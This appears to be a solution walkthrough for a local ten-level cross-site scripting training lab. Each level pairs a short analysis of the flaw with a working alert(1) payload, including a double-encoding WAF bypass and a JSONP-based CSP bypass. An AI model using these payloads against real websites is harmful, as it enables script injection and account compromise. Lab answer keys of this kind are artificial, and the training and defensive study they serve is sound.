## Level 1: Reflected (No Filter)

Goal: Execute basic JavaScript.
Analysis: Input from parameter q is reflected directly into the HTML body without any filtering.
Payload:
```
<script>alert(1)</script>
```

## Level 2: Stored (Persistence)

Goal: Store malicious code in the Database.
Analysis: Comments are saved to SQLite and rendered back whenever the page loads. No input/output sanitization.
Payload:
```
<img src=x onerror=alert(1)>
```

## Level 3: DOM Based (Fragment)

Goal: Exploit Client-side processing.
Analysis: The server ignores data after #. Client-side JavaScript reads location.hash and assigns it to innerHTML.
Payload (URL):
```
http://localhost:5000/level3#<img src=x onerror=alert(1)>
```
Note: Refresh (F5) the page after changing the URL for the JS to trigger.

## Level 4: Tag Filter (No Script)

Goal: Bypass `<script>` tag filter.

Analysis: Server uses Regex to remove `<script>` tags (case-insensitive). Other tags are valid.
Payload:
```
<img src=x onerror=alert(1)>
```

## Level 5: Attribute Injection (Breakout)

Goal: Break out of HTML attribute.
Analysis: Input is inside `<input value="...">`. Server escapes < and > so you cannot create new tags. However, double quotes " are not escaped.
Payload:
```
" onmouseover="alert(1)
```

Or auto-trigger:
```
" autofocus onfocus="alert(1)
```

## Level 6: Protocol Injection (Href)

Goal: Use Pseudo-protocol.
Analysis: Input is inside `<a href="...">`. Server escapes all special chars (<, >, ", '). Cannot break out of the attribute.
Payload:
```
javascript:alert(1)
```

Action: Click the "VISIT DESTINATION" button to trigger.

## Level 7: JS Context (String Escape)

Goal: Break out of JavaScript string.
Analysis: Input is inside JS variable: var x = 'INPUT'. Server blocks < > " /. But forgot to block single quote '.
Payload:
```
';alert(1);'
```

## Level 8: Double Encoding (WAF Bypass)

Goal: Bypass WAF keyword check.
Analysis:

WAF decodes input once and checks for `<script or javascript:`.

Application decodes input AGAIN (Double Decode) before rendering.
Payload: Encode sensitive chars (<) twice `(%3C -> %253C)`.
```
%253Cscript%253Ealert(1)%253C/script%253E
```

## Level 9: Client-Side Template Injection (CSTI)

Goal: Exploit Custom Template Engine.
Analysis: Client JS looks for {{ code }} string in URL Fragment and passes it to eval().
Payload (URL):
```
http://localhost:5000/level9#name={{alert(1)}}
```

## Level 10: CSP Bypass (JSONP Gadget)

Goal: Bypass Strict Content Security Policy.
Analysis:

CSP only allows scripts from self (script-src 'self').

There is a JSONP API at /api/widgets?callback=....

We use a `<script src="...">` tag pointing to this API. Since API is on self, it is allowed. The API returns JS code controlled via the callback parameter.
Payload:
```
<script src="/api/widgets?callback=alert(1)"></script>
```